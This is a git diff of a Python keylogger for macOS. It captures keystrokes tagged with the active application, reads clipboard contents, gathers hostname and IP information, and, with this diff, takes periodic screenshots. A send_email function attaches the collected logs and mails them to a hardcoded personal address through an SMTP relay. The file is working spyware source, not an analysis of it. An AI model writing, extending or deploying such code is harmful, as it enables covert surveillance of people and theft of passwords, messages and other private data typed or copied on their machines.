@@ -5,18 +5,20 @@ import time
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 from AppKit import NSWorkspace, NSPasteboard, NSStringPboardType
-
 from requests import get
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
 
 buffer_size = 20
 keys = []
 apps = []
 count = 0
+last_active_app = None
 
 time_interval = 15
 number_of_iterations = 5
@@ -34,7 +36,7 @@ def on_press(key):
 
     current_time = time.time()
 
-    # once the lists have 10 entries in them, call write to file and clear lists
+    # once the lists have x amount of entries in them, call write to file and clear lists
     if count == buffer_size:
         write_file(keys, apps)
         count = 0
@@ -52,34 +54,32 @@ def on_release(key):
 def write_file(keys, apps):
     # Logs each key press
     with open("out/log.txt", "a") as file:
-        last_active_app = None
         nl = "\n"
+        last_active_app = apps[0]
 
         #loops through each key/app in keys/apps lists 
         for n in range(buffer_size):
             k = str(keys[n]).replace("'", "")
-            #converts current app to string, otherwise 
-            current_app = str(apps[n])
+            current_app = apps[n]
 
-            # is current application changes, start logging on new line
+            # if current application changes, start logging on new line
             if (last_active_app != current_app):
                 last_active_app = current_app
-                ts = datetime.now().ctime()
+                timestamp = datetime.now().ctime()
 
-                file.write(nl + ts + " " + current_app + " " + k)
-                
-                #debug
-                print(f'working app changed to {current_app}\n')
-                print(n)
+                file.write(nl + timestamp + " " + current_app + " " + k)
+
             # if space bar pressed, start logging on new line
             elif (k == 'Key.space'):
-                ts = datetime.now().ctime()
+                timestamp = datetime.now().ctime()
 
-                file.write(nl + ts + " " + current_app + " ")
+                file.write(nl + timestamp + " " + current_app + " ")
+            elif (k.startswith("Key.")):
+                file.write(' ' + k + ' ')
             else:
                 file.write(k)
                 
-
+# Initialises log file with column names
 def init_log_file():
     # Creates out/log.txt if it doesnt already exist
     if (os.path.isfile("out/log.txt") != True):
@@ -87,6 +87,7 @@ def init_log_file():
             print("log.txt not found, creating file.\n")
             file.write("Timestamp, Current Application, Keys pressed\n")
 
+# Gets system information about host and logs it to out/sysinfo.txt
 def log_sys_info():
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
@@ -108,6 +109,7 @@ def log_sys_info():
         f"Architecture: {arch}\n\n"
     )
 
+    # If file exists open in 'append' mode, else create file and write system information
     if (os.path.isfile("out/sysinfo.txt") != True):
         with open("out/sysinfo.txt", "x") as file:
             print("sysinfo.txt not found, creating file.\n")
@@ -116,6 +118,7 @@ def log_sys_info():
         with open("out/sysinfo.txt", "a") as file:
             file.write(sysinfo)
 
+# Constructs and sends an email to specified recipient and attaches log files.
 def send_email():
     fromaddr = "MS_hPVXeT@test-p7kx4xw63p7g9yjr.mlsender.net"
     toaddr = 'ibraheem.m.a04@gmail.com'
@@ -149,7 +152,7 @@ def send_email():
 
     # Authentication
     s.login(fromaddr,os.environ['mail_pass'])
-    # Converts the Multipart msg into a string
+    # Coverts the Multipart msg into a string
     text = msg.as_string()
     # sending the mail
     s.sendmail(fromaddr, toaddr, text)
@@ -157,13 +160,10 @@ def send_email():
     # terminating the session
     s.quit()
 
+# Gets whatever is currently in users clipboard and saves it to clipboard.txt
 def log_clipboard():
     pb = NSPasteboard.generalPasteboard()
     pbstring = pb.stringForType_(NSStringPboardType)
-    print("Pastboard string: %s \n" % pbstring)
-
-    with open("out/clipboard.txt", "a") as file:
-        file.write(pbstring + "\n")
 
     if (os.path.isfile("out/clipboard.txt") != True):
         with open("out/clipboard.txt", "x") as file:
@@ -172,6 +172,11 @@ def log_clipboard():
     else:
         with open("out/clipboard.txt", "a") as file:
             file.write(pbstring + "\n")
+
+def take_screenshot(iteration_count):
+    screenshot = ImageGrab.grab()
+    screenshot.show()
+    screenshot.save(f"out/screenshot{iteration_count}.png")
 
 if __name__ == "__main__":
     iteration_count = 0
@@ -192,18 +197,10 @@ if __name__ == "__main__":
         if current_time > stopping_time:
             #send_email()
             log_clipboard()
-            log_sys_info()
+            take_screenshot(iteration_count)
 
             print("Iterated\n")
 
             iteration_count += 1
             current_time = time.time()
             stopping_time = current_time + time_interval
-            
-        # listener = Listener(
-        #     on_press=on_press,
-        #     on_release=on_release)
-
-        # listener.start()
-        # time.sleep(20)
-        # print("Key Logger is running\nPressing any key will append it to out/log.txt")
